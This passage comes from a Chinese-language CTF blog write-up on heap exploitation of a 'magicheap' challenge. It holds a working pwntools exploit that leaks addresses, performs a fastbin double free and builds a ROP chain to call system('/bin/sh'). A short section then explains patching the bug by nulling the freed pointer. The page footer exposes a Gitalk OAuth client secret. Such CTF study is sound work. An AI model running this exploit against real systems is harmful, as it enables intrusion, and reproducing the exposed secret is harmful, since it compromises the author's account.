&apos;-c&apos;]</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">token = &apos;&apos;</span><br><span class="line">binary=&apos;./pwn&apos;</span><br><span class="line">libc=ELF(&apos;./libc.so&apos;)</span><br><span class="line">def dbg(breakpoint):</span><br><span class="line">    gdbscript = &apos;&apos;</span><br><span class="line">    elf_base = 0</span><br><span class="line">    gdbscript += &apos;b *&#123;:#x&#125;\n&apos;.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint</span><br><span class="line">    gdbscript += &apos;c\n&apos;</span><br><span class="line">    log.info(gdbscript)</span><br><span class="line">    gdb.attach(io, gdbscript)</span><br><span class="line">    time.sleep(1)</span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">	sla(&apos;choice:&apos;,1)</span><br><span class="line">	sla(&apos;size&apos;,size)</span><br><span class="line">	sa(&apos;inpute&apos;,con)</span><br><span class="line">def rm(index):</span><br><span class="line">	sla(&apos;choice:&apos;,str(4))</span><br><span class="line">	sla(&apos;index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def exploit(io):</span><br><span class="line">	sa(&apos;name?&apos;,&apos;a&apos;*0x18)</span><br><span class="line">	ru(&apos;\n&apos;)</span><br><span class="line">	stack_addr=u64(ru(&apos;input&apos;)[0x18:0x18+6].ljust(8,&apos;\x00&apos;))</span><br><span class="line">	print &apos;stack_addr=&apos;+hex(stack_addr)</span><br><span class="line">	sa(&apos;ID&apos;,&apos;a&apos;*8)</span><br><span class="line">	ru(&apos;a&apos;*8)</span><br><span class="line">	libc_base=u64(ru(&apos;\n&apos;)[0:6].ljust(8,&apos;\x00&apos;))-libc.sym[&apos;_IO_file_setbuf&apos;]-9</span><br><span class="line">	malloc_hook=libc_base+libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">	free_hook=libc_base+libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">	system=libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">	bin_sh=libc_base+0x000000000018cd57</span><br><span class="line">	pop_rdi=libc_base+0x0000000000021102</span><br><span class="line">	print &apos;libc=&apos;+hex(libc_base)</span><br><span class="line">	add(0x40,&apos;aaaaaaaa&apos;)</span><br><span class="line">	add(0x40,&apos;aaaaaaaaa&apos;)</span><br><span class="line">	add(0x50,&apos;aaaaa&apos;)</span><br><span class="line">	add(0x40,&apos;aaaaaaa&apos;)</span><br><span class="line">	rm(2)</span><br><span class="line">	rm(0)</span><br><span class="line">	rm(1)</span><br><span class="line">	rm(0)</span><br><span class="line">	raw_input(&apos;##&apos;)</span><br><span class="line">       	add(0x40,p64(malloc_hook-3-8+0x40))</span><br><span class="line">	raw_input(&apos;##&apos;)</span><br><span class="line">	add(0x40,&apos;aaa&apos;)</span><br><span class="line">	add(0x40,&apos;aaa&apos;)</span><br><span class="line">	try:</span><br><span class="line">		add(0x40,&apos;a&apos;*(3+8*4)+p64(stack_addr-88-0x10))</span><br><span class="line">	except:</span><br><span class="line">		io.close()</span><br><span class="line">		io=main()</span><br><span class="line">		exploit(io)</span><br><span class="line">	print &apos;heap start 0x56 you win&apos;</span><br><span class="line">	raw_input(&apos;###&apos;)</span><br><span class="line">	add(0x30,p64(pop_rdi)+p64(bin_sh)+p64(system))</span><br><span class="line">def main(argv=None):</span><br><span class="line">	global io</span><br><span class="line">	if argv==None:</span><br><span class="line">		argv=sys.argv</span><br><span class="line">	if len(argv) &gt; 2:</span><br><span class="line">        	io = remote(sys.argv[1], sys.argv[2])</span><br><span class="line">		return io</span><br><span class="line"> 	else:</span><br><span class="line">        	io = process(binary)</span><br><span class="line">	if len(argv)&gt;1:</span><br><span class="line">                gdb.attach(io,&apos;directory /home/pwn/libc/glibc-2.23/malloc/&apos;)</span><br><span class="line">	return io</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    io= main()</span><br><span class="line">    exploit(io)</span><br><span class="line">    irt()</span><br></pre></td></tr></table></figure>
+<h2 id="fix-it"><a href="#fix-it" class="headerlink" title="fix it"></a>fix it</h2><p>这个漏洞攻击完了但是如何修复呢？</p>
+<p>ida的keypatch插件很好用，一般的话程序的.eh_frame段，一般程序运行的话，不需要这一段的数据，在这一段找一小段没有被引用的段写入汇编程序，然后就可以fix好了</p>
+<p>对于这个题目只需要把指针置0就可以了,本题只需要jmp一小段汇编程序即可<br><img src="/2019/06/06/top-chunk/top-chunk/patch.png" alt=""></p>
+<p><img src="/2019/06/06/top-chunk/top-chunk/patch1.png" alt=""></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf-pwn/" rel="tag"># ctf,pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/05/27/libc源码分析/" rel="next" title="'libc源码分析'">
+                  <i class="fa fa-chevron-left"></i> 'libc源码分析'
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2019/08/02/攻防世界刷题记录/" rel="prev" title="'攻防世界刷题记录'">
+                  '攻防世界刷题记录' <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-top-chunk"><span class="nav-number">1.</span> <span class="nav-text">0x00 top chunk</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-利用方式"><span class="nav-number">2.</span> <span class="nav-text">0x01 利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-House-Of-Force"><span class="nav-number">2.1.</span> <span class="nav-text">0x00 House Of Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-利用条件"><span class="nav-number">2.1.1.</span> <span class="nav-text">0x01 利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-利用方法"><span class="nav-number">2.1.2.</span> <span class="nav-text">0x02 利用方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-另一种利用方式"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 另一种利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-利用场景"><span class="nav-number">2.2.1.</span> <span class="nav-text">0x00 利用场景</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-magicheap"><span class="nav-number">3.</span> <span class="nav-text">0x02 magicheap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">3.1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-环境说明"><span class="nav-number">3.2.</span> <span class="nav-text">0x01 环境说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#break-it"><span class="nav-number">3.3.</span> <span class="nav-text">break it</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-checksec"><span class="nav-number">3.3.1.</span> <span class="nav-text">0x01 checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞点"><span class="nav-number">3.3.2.</span> <span class="nav-text">0x02 漏洞点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-leak-address"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">0x00 leak address</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-free时指针未置0"><span class="nav-number">3.3.3.</span> <span class="nav-text">0x01 free时指针未置0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-遇到的问题"><span class="nav-number">3.3.4.</span> <span class="nav-text">0x02 遇到的问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-具体步骤"><span class="nav-number">3.3.5.</span> <span class="nav-text">0x03 具体步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fix-it"><span class="nav-number">3.4.</span> <span class="nav-text">fix it</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt="PwnHt"
+    src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">PwnHt</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/pwnht" title="GitHub &rarr; https://github.com/pwnht" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/05171683@cumt.edu.cn" title="E-Mail &rarr; 05171683@cumt.edu.cn"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://3nd.xyz/" title="https://3nd.xyz/" rel="noopener" target="_blank">3ND</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://dayjun.top/" title="https://dayjun.top/" rel="noopener" target="_blank">哒君</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://iyzyi.com/" title="http://iyzyi.com/" rel="noopener" target="_blank">iyzyi</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">PwnHt</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.5.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: '0c9c9c5050bd212943da',
+      clientSecret: 'e88bf594e600fa4c1956d2ff2b5aeab8ea9ece28',
+      repo: 'gitalk-commnet',
+      owner: 'pwnht',
+      admin: ['pwnht'],
+      id: 'ea2f583fca47ad69f07125fc613e5afc',
+        language: 'zh-CN',
+      distractionFreeMode: 'false'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+</body>
+</html>
